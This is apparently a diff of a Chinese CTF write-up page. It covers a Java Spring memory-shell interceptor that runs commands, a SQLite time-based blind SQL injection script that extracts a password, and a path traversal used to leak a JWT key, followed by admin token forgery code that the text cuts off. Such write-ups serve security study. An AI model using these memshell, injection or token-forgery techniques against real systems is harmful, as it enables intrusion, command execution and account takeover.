+</span></span><span style="display:flex;"><span>        org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">WebApplicationContext</span> context <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">RequestAttributes</span> requestAttributes <span style="color:#f92672">=</span> org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">RequestContextHolder</span>.<span style="color:#a6e22e">getRequestAttributes</span>();
+</span></span><span style="display:flex;"><span>            Class cla <span style="color:#f92672">=</span> requestAttributes.<span style="color:#a6e22e">getClass</span>();
+</span></span><span style="display:flex;"><span>            java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">Method</span> me <span style="color:#f92672">=</span> cla.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;getRequest&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{});
+</span></span><span style="display:flex;"><span>            me.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>            javax.<span style="color:#a6e22e">servlet</span>.<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">HttpServletRequest</span> httprequest <span style="color:#f92672">=</span> (javax.<span style="color:#a6e22e">servlet</span>.<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">HttpServletRequest</span>) me.<span style="color:#a6e22e">invoke</span>(requestAttributes, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{});
+</span></span><span style="display:flex;"><span>            javax.<span style="color:#a6e22e">servlet</span>.<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">HttpSession</span> session <span style="color:#f92672">=</span> httprequest.<span style="color:#a6e22e">getSession</span>();
+</span></span><span style="display:flex;"><span>            javax.<span style="color:#a6e22e">servlet</span>.<span style="color:#a6e22e">ServletContext</span> servletContext <span style="color:#f92672">=</span> session.<span style="color:#a6e22e">getServletContext</span>();
+</span></span><span style="display:flex;"><span>            context <span style="color:#f92672">=</span> org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">support</span>.<span style="color:#a6e22e">WebApplicationContextUtils</span>.<span style="color:#a6e22e">getWebApplicationContext</span>(servletContext);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">Method</span> defineclass <span style="color:#f92672">=</span> ClassLoader.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;defineClass&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>, <span style="color:#66d9ef">int</span>.<span style="color:#a6e22e">class</span>, <span style="color:#66d9ef">int</span>.<span style="color:#a6e22e">class</span>});
+</span></span><span style="display:flex;"><span>        defineclass.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HandlerInterceptor memShellInterceptor <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            memShellInterceptor <span style="color:#f92672">=</span> (HandlerInterceptor) Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;com.example.javaguide.EvilInterceptor&#34;</span>).<span style="color:#a6e22e">newInstance</span>();
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e){
+</span></span><span style="display:flex;"><span>            memShellInterceptor <span style="color:#f92672">=</span> (HandlerInterceptor) ((Class) defineclass.<span style="color:#a6e22e">invoke</span>(classLoader, classBytes, 0, classBytes.<span style="color:#a6e22e">length</span>)).<span style="color:#a6e22e">newInstance</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        AbstractHandlerMapping abstractHandlerMapping <span style="color:#f92672">=</span> (AbstractHandlerMapping) context.<span style="color:#a6e22e">getBean</span>(<span style="color:#e6db74">&#34;requestMappingHandlerMapping&#34;</span>);
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> AbstractHandlerMapping.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;adaptedInterceptors&#34;</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        List<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> adaptedInterceptors <span style="color:#f92672">=</span> (List<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>) field.<span style="color:#a6e22e">get</span>(abstractHandlerMapping);
+</span></span><span style="display:flex;"><span>        adaptedInterceptors.<span style="color:#a6e22e">add</span>(memShellInterceptor);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;interceptor injected successfully&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, SerializationHandler<span style="color:#f92672">[]</span> handlers) <span style="color:#66d9ef">throws</span> TransletException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#66d9ef">throws</span> TransletException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>其中<code>encodedstr</code>为恶意Interceptor类的字节码base64</p>
+<p>恶意Interceptor类：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.example.javaguide;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.HandlerInterceptor;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.ModelAndView;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletRequest;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletResponse;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">EvilInterceptor</span> <span style="color:#66d9ef">implements</span> HandlerInterceptor {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">preHandle</span>(HttpServletRequest request, HttpServletResponse response, Object handler) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            Process exec <span style="color:#f92672">=</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;cat /flag&#34;</span>);
+</span></span><span style="display:flex;"><span>            java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">InputStream</span> inputStream <span style="color:#f92672">=</span> exec.<span style="color:#a6e22e">getInputStream</span>();
+</span></span><span style="display:flex;"><span>            javax.<span style="color:#a6e22e">servlet</span>.<span style="color:#a6e22e">ServletOutputStream</span> outputStream <span style="color:#f92672">=</span> response.<span style="color:#a6e22e">getOutputStream</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> buf <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>8192<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> length;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> ((length <span style="color:#f92672">=</span> inputStream.<span style="color:#a6e22e">read</span>(buf)) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1) {
+</span></span><span style="display:flex;"><span>                outputStream.<span style="color:#a6e22e">write</span>(buf, 0, length);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">postHandle</span>(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">afterCompletion</span>(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="奶龙回家">奶龙回家<a hidden class="anchor" aria-hidden="true" href="#奶龙回家">#</a></h2>
+<p>返回包server为<code>Werkzeug/3.1.3 Python/3.10.16</code>，猜测为flask框架，凭经验来说一般搭配mysql或sqlite</p>
+<p><code>randomblob(1000000000)</code>可以延时，确定为sqlite数据库。</p>
+<p>通过测试猜测sql语句如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{username}&#39;</span> <span style="color:#66d9ef">and</span> password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{password}&#39;</span>;
+</span></span></code></pre></div><p>服务器应该还有一层检测，在flask路由处也会判断username和password是否正确。这就导致构造的万能密码无法登陆，但确可以盲注，当然也有可能时sql语句我猜错了。</p>
+<p>不过，至少以下payload可以时间盲注：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;username&#34;</span> : <span style="color:#e6db74">&#34;asdasda&#39;/**/or/**/(length(username)&gt;0)/**/or/**/randomblob(1000000000)&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;password&#34;</span> : <span style="color:#e6db74">&#34;/**/or/**/&#39;zzzzzzzzzzzzzzz&#39;&gt;&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>转换成sql语句如下(大概)：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;asdasda&#39;</span><span style="color:#75715e">/**/</span><span style="color:#66d9ef">or</span><span style="color:#75715e">/**/</span>(<span style="color:#66d9ef">length</span>(username)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)<span style="color:#75715e">/**/</span><span style="color:#66d9ef">or</span><span style="color:#75715e">/**/</span>randomblob(<span style="color:#ae81ff">1000000000</span>)<span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#39; and password = &#39;</span><span style="color:#75715e">/**/</span><span style="color:#66d9ef">or</span><span style="color:#75715e">/**/</span><span style="color:#e6db74">&#39;zzzzzzzzzzzzzzz&#39;</span><span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span></code></pre></div><p>注释、空格以及等号被过滤了。</p>
+<p>当<code>length(username)&gt;0</code>成立时由于<code>or</code>的短路特性，后面表达式不会运行，也就不会延时。</p>
+<p>exp:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span>
+</span></span><span style="display:flex;"><span>cha <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cha = &#39;abcdefghijklmnopqrstuvwxyz&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;asdasda&#39;/**/or/**/((substr(password,</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">,1)&lt;&gt;&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;))/**/or/**/randomblob(1000000000)&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># password = &#39;woaipangmao114514&#39;</span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> len(password) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">17</span>:
+</span></span><span style="display:flex;"><span>    signal <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> cha:
+</span></span><span style="display:flex;"><span>        json <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;username&#34;</span> : payload<span style="color:#f92672">.</span>format(str(len(password) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>), c),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;password&#34;</span> : <span style="color:#e6db74">&#34;/**/or/**/&#39;zzzzzzzzzzzzzzz&#39;&gt;&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        print(password <span style="color:#f92672">+</span> c, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/login&#39;</span>, json<span style="color:#f92672">=</span>json, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            print(password)
+</span></span><span style="display:flex;"><span>            exit()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            password <span style="color:#f92672">=</span> password <span style="color:#f92672">+</span> c
+</span></span><span style="display:flex;"><span>            signal <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> signal:
+</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> password <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;_&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(password)
+</span></span></code></pre></div><p>账密：<code>nailong:woaipangmao114514</code></p>
+<h2 id="gin">Gin<a hidden class="anchor" aria-hidden="true" href="#gin">#</a></h2>
+<p>权限使用jwt验证，jwt的key生成代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GenerateKey</span>() <span style="color:#66d9ef">string</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Seed</span>(<span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">Year</span>())
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">randomNumber</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Intn</span>(<span style="color:#ae81ff">1000</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">key</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%03d%s&#34;</span>, <span style="color:#a6e22e">randomNumber</span>, <span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">Key</span>())
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">key</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>虽然用了随机数，但只要种子也就是<code>config.Year()</code>和<code>config.Key()</code>的值是固定的则key也是固定的。</p>
+<p>附件里的config目录里的key.go内容为空，需要从远程靶机获取。</p>
+<p><code>/download</code>路由代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Download</span>(<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">gin</span>.<span style="color:#a6e22e">Context</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">filename</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">DefaultQuery</span>(<span style="color:#e6db74">&#34;filename&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">Response</span>(<span style="color:#a6e22e">c</span>, <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusBadRequest</span>, <span style="color:#ae81ff">400</span>, <span style="color:#66d9ef">nil</span>, <span style="color:#e6db74">&#34;Filename is required&#34;</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">basepath</span> <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#34;./uploads&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">filepath</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">JoinPath</span>(<span style="color:#a6e22e">basepath</span>, <span style="color:#a6e22e">filename</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stat</span>(<span style="color:#a6e22e">filepath</span>); <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">IsNotExist</span>(<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">Response</span>(<span style="color:#a6e22e">c</span>, <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusBadRequest</span>, <span style="color:#ae81ff">404</span>, <span style="color:#66d9ef">nil</span>, <span style="color:#e6db74">&#34;File not found&#34;</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Header</span>(<span style="color:#e6db74">&#34;Content-Disposition&#34;</span>, <span style="color:#e6db74">&#34;attachment; filename=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">filename</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">File</span>(<span style="color:#a6e22e">filepath</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>存在目录穿越，可以用来下载任意文件。</p>
+<p>下载key.go：<code>/download?filename=../config/key.go</code>,内容如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">config</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Key</span>() <span style="color:#66d9ef">string</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;r00t32l&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Year</span>() <span style="color:#66d9ef">int64</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>现在可以伪造admin的token：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;math/rand&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;time&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/golang-jwt/jwt/v4&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">token</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">GenerateToken</span>(<span style="color:#e6db74">&#34;admin&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;error&#34;</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">token</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Key</span>() <span style="color:#66d9ef">string</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;r00t32l&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Year</span>() <span style="color:#66d9ef">int64</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">JWTClaims</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Username</span> <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;username&#34;`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">RegisteredClaims</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GenerateKey</span>() <span style="color:#66d9ef">string</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Seed</span>(<span style="color:#a6e22e">Year</span>())
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">randomNumber</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Intn</span>(<span style="color:#ae81ff">1000</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">key</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%03d%s&#34;</span>, <span style="color:#a6e22e">randomNumber</span>, <span style="color:#a6e22e">Key</span>())
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">key</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GenerateToken</span>(<span style="color:#a6e22e">username</span> <span style="color:#66d9ef">string</span>) (<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">key</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">GenerateKey</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">claims</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">JWTClaims</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Username</span>: <span style="color:#a6e22e">username</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">RegisteredClaims</span>: <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">RegisteredClaims</span>{
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ExpiresAt</span>: <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">NewNumericDate</span>(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">24</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Hour</span>)),
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">IssuedAt</span>:  <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">NewNumericDate</span>(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>()),
